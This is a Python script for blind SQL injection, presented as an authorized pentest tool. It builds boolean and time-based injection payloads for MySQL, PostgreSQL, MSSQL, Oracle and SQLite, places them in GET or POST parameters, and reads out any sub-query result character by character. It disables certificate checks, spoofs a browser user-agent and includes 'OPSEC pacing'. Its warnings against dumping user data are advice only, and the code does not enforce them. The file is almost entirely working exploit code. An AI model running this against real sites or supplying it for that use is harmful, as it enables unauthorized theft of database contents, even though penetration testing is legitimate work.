#!/usr/bin/env python3
"""
sqli_blind.py — authorized BLIND SQL-injection extractor. Reads the result of a scalar sub-query character-by-character
through a BOOLEAN (response-difference) or TIME (delay) oracle (SQL_INJECTION_TESTING_GUIDE.md §7/§8).

It binary-searches each character's ASCII value (~7 requests/char instead of ~95), for either:
  --mode boolean : a TRUE condition yields the --true marker (or differs from --false); FALSE does not.
  --mode time    : a TRUE condition makes the DB SLEEP --delay-marker seconds; FALSE returns fast.

Discipline: extract a SHORT, BENIGN value (default `select @@version`, or your own test row) to PROVE the read —
never dump real users' data. Pace it (--delay) — blind extraction is request-heavy and loud (§27).

Usage (boolean, GET, inject the `id` param):
  python3 sqli_blind.py -u "https://target/item?id=1" --inject id --mode boolean \
      --true "in stock" --dbms mysql --extract "select database()"

Usage (time-based, POST):
  python3 sqli_blind.py -u "https://target/login" --method POST --data "user=1&pass=x" --inject user \
      --mode time --delay-marker 5 --dbms mysql --extract "select @@version"

The --prefix/--suffix wrap your injected condition to fit the context (string vs numeric). Tune them on a KNOWN
value first (e.g. confirm length, then char 1) — blind extraction is context-dependent.
"""
import argparse, sys, time, urllib.parse as up

# be UTF-8-safe on Windows cp1252 consoles too (output uses → ⭐ §); harmless under WSL/Kali UTF-8
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"

# per-DBMS scalar helpers: SUBSTRING fn + ASCII fn + sleep template (for TRUE-branch delay). §8/Appendix C
DBMS = {
    "mysql":    dict(sub="SUBSTRING", asc="ASCII", length="LENGTH",
                     sleep="IF(({cond}),SLEEP({n}),0)"),
    "postgres": dict(sub="SUBSTR",    asc="ASCII", length="LENGTH",
                     sleep="(CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({n})) ELSE 1 END)"),
    "mssql":    dict(sub="SUBSTRING", asc="UNICODE", length="LEN",
                     sleep="(CASE WHEN ({cond}) THEN 1 ELSE 1 END)"),  # MSSQL time uses WAITFOR, handled below
    "oracle":   dict(sub="SUBSTR",    asc="ASCII", length="LENGTH",
                     sleep="(CASE WHEN ({cond}) THEN dbms_pipe.receive_message(('a'),{n}) ELSE 1 END)"),
    "sqlite":   dict(sub="SUBSTR",    asc="UNICODE", length="LENGTH", sleep=None),
}


def build_req(url, data, inject_field, payload):
    """Place `payload` at FUZZ > --inject named param > appended param (GET or POST body)."""
    enc = up.quote(payload, safe="")
    if data:
        if "FUZZ" in data:
            return url, data.replace("FUZZ", enc)
        pairs, replaced = [], False
        for kv in data.split("&"):
            k = kv.split("=", 1)[0]
            if inject_field and k == inject_field:
                pairs.append(f"{k}={enc}"); replaced = True
            else:
                pairs.append(kv)
        if inject_field and not replaced:
            pairs.append(f"{inject_field}={enc}")
        return url, "&".join(pairs)
    # GET
    if "FUZZ" in url:
        return url.replace("FUZZ", enc), None
    parsed = up.urlsplit(url)
    pairs, replaced = [], False
    for kv in parsed.query.split("&") if parsed.query else []:
        k = kv.split("=", 1)[0]
        if inject_field and k == inject_field:
            pairs.append(f"{k}={enc}"); replaced = True
        else:
            pairs.append(kv)
    if not replaced:
        pairs.append(f"{inject_field or 'q'}={enc}")
    new_q = "&".join(pairs)
    return up.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_q, parsed.fragment)), None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="target; FUZZ marks the injection point (GET)")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--data", help="POST body; FUZZ marks injection or use --inject <field>")
    ap.add_argument("--inject", help="param/field to inject")
    ap.add_argument("--mode", default="boolean", choices=["boolean", "time"])
    ap.add_argument("--true", dest="truemark", help="[boolean] marker present when the condition is TRUE")
    ap.add_argument("--false", dest="falsemark", help="[boolean] marker present when FALSE (alternative oracle)")
    ap.add_argument("--delay-marker", type=int, default=5, help="[time] seconds the TRUE branch should sleep")
    ap.add_argument("--dbms", required=True, choices=list(DBMS.keys()))
    ap.add_argument("--extract", required=True, help="scalar sub-query to read, e.g. \"select @@version\"")
    ap.add_argument("--prefix", default="' AND ", help="injected before the condition (context fit; default string-AND)")
    ap.add_argument("--suffix", default="-- -", help="injected after the condition (default comment-out)")
    ap.add_argument("--maxlen", type=int, default=64, help="stop after N chars (bounded PoC; default 64)")
    ap.add_argument("--delay", type=float, default=0.0, help="seconds between requests (OPSEC pacing)")
    ap.add_argument("--timeout", type=float, default=30)
    a = ap.parse_args()
    if a.mode == "boolean" and not (a.truemark or a.falsemark):
        sys.exit("boolean mode needs --true (or --false) to define the oracle")
    eng = DBMS[a.dbms]
    if a.mode == "time" and eng["sleep"] is None:
        sys.exit(f"{a.dbms} has no reliable time primitive — use --mode boolean or OOB (§8/§10)")
    sess = requests.Session()
    sub, asc, length = eng["sub"], eng["asc"], eng["length"]

    def cond_payload(cond):
        """Wrap a boolean `cond` into a full injected value for the chosen mode/engine."""
        if a.mode == "boolean":
            return f"{a.prefix}({cond}){a.suffix}"
        # time mode
        if a.dbms == "mssql":
            return f"'; IF ({cond}) WAITFOR DELAY '0:0:{a.delay_marker}'-- -"
        sleeper = eng["sleep"].format(cond=cond, n=a.delay_marker)
        return f"{a.prefix}{sleeper}{a.suffix}"

    def is_true(cond):
        payload = cond_payload(cond)
        u, d = build_req(a.url, a.data, a.inject, payload)
        try:
            t0 = time.time()
            if a.method == "POST":
                r = sess.post(u, data=d, headers={"User-Agent": UA}, timeout=a.timeout,
                              verify=False, allow_redirects=False)
            else:
                r = sess.get(u, headers={"User-Agent": UA}, timeout=a.timeout,
                             verify=False, allow_redirects=False)
            elapsed = time.time() - t0
        except requests.exceptions.ReadTimeout:
            return a.mode == "time"  # a timeout in time-mode counts as a (very) delayed TRUE
        except Exception:
            return False
        if a.delay:
            time.sleep(a.delay)
        if a.mode == "time":
            return elapsed >= a.delay_marker * 0.7
        if a.falsemark:
            return a.falsemark not in r.text
        return (a.truemark in r.text) or r.status_code in (301, 302, 303)

    # sanity: a tautology must read TRUE, a contradiction FALSE — confirms the oracle/context before extracting
    print(f"[*] oracle sanity ({a.mode}, {a.dbms}):")
    if not is_true("1=1") or is_true("1=2"):
        print("   [!] oracle not reliable — tune --prefix/--suffix to the context (string vs numeric), and "
              "--true/--false (boolean) or --delay-marker (time). Confirm 1=1→TRUE, 1=2→FALSE first (§5/§7/§8).")
        return
    print("   [+] 1=1 → TRUE, 1=2 → FALSE. Oracle good. Extracting (bounded to --maxlen).")

    # binary-search the length first (cheaper + tells us when to stop)
    lo, hi = 0, a.maxlen
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if is_true(f"{length}(({a.extract}))>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    n = lo
    print(f"   [+] length({a.extract}) = {n}")
    if n == 0:
        print("   [!] length 0 — the sub-query returned empty/NULL; check --extract and privileges.")
        return

    extracted = ""
    for pos in range(1, min(n, a.maxlen) + 1):
        lo, hi = 0, 127  # printable ASCII range; widen if extracting binary/hex
        while lo < hi:
            mid = (lo + hi) // 2
            # is the char's code > mid ?
            if is_true(f"{asc}({sub}(({a.extract}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        extracted += chr(lo)
        print(f"   {a.extract}[{pos}] = {chr(lo)!r}   so far: {extracted!r}")

    print(f"\n[+] extracted (bounded): {a.extract} = {extracted!r}")
    print("[!] This proves blind read access. STOP here for the PoC — do not mass-extract real users' data (§25).")


if __name__ == "__main__":
    main()
